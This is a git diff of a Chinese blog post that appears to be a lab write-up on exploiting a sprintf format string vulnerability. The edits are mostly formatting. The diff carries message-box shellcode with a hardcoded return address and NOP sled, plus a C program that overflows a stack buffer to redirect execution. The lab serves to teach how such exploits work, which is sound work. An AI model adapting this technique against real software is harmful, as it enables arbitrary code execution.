@@ -60,8 +60,9 @@ int main(){
 ```
 
 * 代码将要查看位于地址`0x77E61044`的内存内容。
-* 前3个参数为提供的3个参数，后面的一群`%x`是为了将`%s`的参数对应到地址`0x77e61044`上，所以可以输出内存`0x77e61044`的内容直到遇到截断符。 {% grouppicture 2-2 %} {%
-  asset_img 3.png %} {% asset_img 4.png %} {% endgrouppicture %} {% asset_img 5.png "内存0x77e61044的内容" %}
+* 前3个参数为提供的3个参数，后面的一群`%x`是为了将`%s`的参数对应到地址`0x77e61044`上，所以可以输出内存`0x77e61044`的内容直到遇到截断符。
+    {% grouppicture 2-2 %} {% asset_img 3.png %} {% asset_img 4.png %} {% endgrouppicture %}
+    {% asset_img 5.png "内存0x77e61044的内容" %}
 * 该段程序输出如下 {% asset_img 6.png %}
 
 ### 实际操作对格式化输出函数漏洞进行利用
@@ -73,50 +74,51 @@ int main(){
 		- `argument` 为可选参数
 	* `sprintf`函数的漏洞点在于它假定任意长度的缓冲区存在。
 
-2. shellcode解析 {% codeblock lang:c line_number:false %} char user[]=
-   "%497d\x39\x4a\x42\x00"
-   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-   "\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"
-   "\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"
-   "\xB8\xBB\xB0\xE7\x77\xFF\xD0\x90\x90\x90\x90"; {% endcodeblock %}
-	* 我们使用数组`user`作为用户的“输入”，`\x39\x4a\x42\x00`为shellcode的起始地址，用来覆盖函数的返回地址。`\x33\xdb`开始是我们的弹框shellcode。当调用`sprintf`
-	  时，它会读取一个参数以`%497d`的格式写入outbuf，由于未提供该参数，会自动将栈地址`0x0012fae0`中的值视为该参数，即`0x12ff80`。需要写入`outbuf`的总字符串长度为 $19+497=516$
-	  ，而`outbuf`长度为`512`，因此会导致栈溢出, 使得函数的返回后执行`sprintf()`后`outbuf`的内容。
+2. shellcode解析
+    {% codeblock lang:c line_number:false %}
+    char user[]=
+    "%497d\x39\x4a\x42\x00"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"
+    "\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"
+    "\xB8\xBB\xB0\xE7\x77\xFF\xD0\x90\x90\x90\x90";
+    {% endcodeblock %}
+	* 我们使用数组`user`作为用户的“输入”，`\x39\x4a\x42\x00`为shellcode的起始地址，用来覆盖函数的返回地址。`\x33\xdb`开始是我们的弹框shellcode。当调用`sprintf`时，它会读取一个参数以`%497d`的格式写入outbuf，由于未提供该参数，会自动将栈地址`0x0012fae0`中的值视为该参数，即`0x12ff80`。需要写入`outbuf`的总字符串长度为 $19+497=516$ ，而`outbuf`长度为`512`，因此会导致栈溢出, 使得函数的返回后执行`sprintf()`后`outbuf`的内容。
 
 3. 漏洞利用
 	- 整体代码如下 
-      ```c 
-      // libraries import omitted 
-      void mem(){ 
-        //__asm int 3 
-        char outbuf[512]; 
-        char buffer[512]; 
-        sprintf(
-	      buffer,
-	      "ERR Wrong command: %.400s", user
-	    ); /* 执行完上一步后buffer[]="ERR Wrong command: %497d\x39\x4a\x42\x00" 00424a39为shellcode地址；此处仅仅就是一串nop而已 */ 
-        sprintf(outbuf,buffer); 
-        //sprintf(outbuf,"ERR Wrong command: %497d\x39\x4a\x42\x00"); 
-      }
-      int main(){ 
-        LoadLibrary("user32.dll"); 
-        mem(); 
-        return 0; 
-      } 
-      ```
+        ```c 
+        // libraries import omitted 
+        void mem(){ 
+          //__asm int 3 
+          char outbuf[512]; 
+          char buffer[512]; 
+          sprintf(
+	        buffer,
+	        "ERR Wrong command: %.400s", user
+	      ); /* 执行完上一步后buffer[]="ERR Wrong command: %497d\x39\x4a\x42\x00" 00424a39为shellcode地址；此处仅仅就是一串nop而已 */ 
+          sprintf(outbuf,buffer); 
+          //sprintf(outbuf,"ERR Wrong command: %497d\x39\x4a\x42\x00"); 
+        }
+        int main(){ 
+          LoadLibrary("user32.dll"); 
+          mem(); 
+          return 0; 
+        } 
+        ```
    
     - `mem`函数中，分配了两个`512`字节大小的缓冲区，并进行了两次`sprintf`操作。
-	- 第一次`sprintf`后，`buffer`（在`0x424a30`）中的内容应该是`"ERR Wrong command: %497d\x39\x4a\x42\x00"`，其后的内容因为有`0x00`而被截断。 {%
-	  grouppicture 2-2 %} {% asset_img 7.png %} {% asset_img 8.png %} {% endgrouppicture %}
-	- 第二次执行`sprintf`，它会读取一个参数以`%497d`的格式写入`outbuf`，由于未提供该参数，会自动将栈地址`0x0012fae0`中的值视为该参数，即`0x12ff80`。 {% asset_img 9.png
-	  %}
+	- 第一次`sprintf`后，`buffer`（在`0x424a30`）中的内容应该是`"ERR Wrong command: %497d\x39\x4a\x42\x00"`，其后的内容因为有`0x00`而被截断。
+        {% grouppicture 2-2 %} {% asset_img 7.png %} {% asset_img 8.png %} {% endgrouppicture %}
+	- 第二次执行`sprintf`，它会读取一个参数以`%497d`的格式写入`outbuf`，由于未提供该参数，会自动将栈地址`0x0012fae0`中的值视为该参数，即`0x12ff80`。
+        {% asset_img 9.png %}
 	- `outbuf`起始地址为`0x0012fd2c`, 19字节的字符串`ERR Wrong command: `后为497字节的整型数字`1245056`，因此从`0012ff30`开始为`\x39\x4a\x42\x00`。
-	  {% asset_img 11.png %}
+	    {% asset_img 11.png %}
 	- 我们成功将返回地址`0x4010d1`覆盖为shellcode的地址`0x424a39`。 
-      {% grouppicture 2-2 %} 
-      {% asset_img 10-ori.png "修改前" %} 
-      {% asset_img 10-changed.png "修改后" %} 
-      {% endgrouppicture %}
+        {% grouppicture 2-2 %} 
+        {% asset_img 10-ori.png "修改前" %} 
+        {% asset_img 10-changed.png "修改后" %} 
+        {% endgrouppicture %}
 	- shellcode成功执行，弹出对话框。 {% asset_img 12.png %}
 
 ## 测试结论
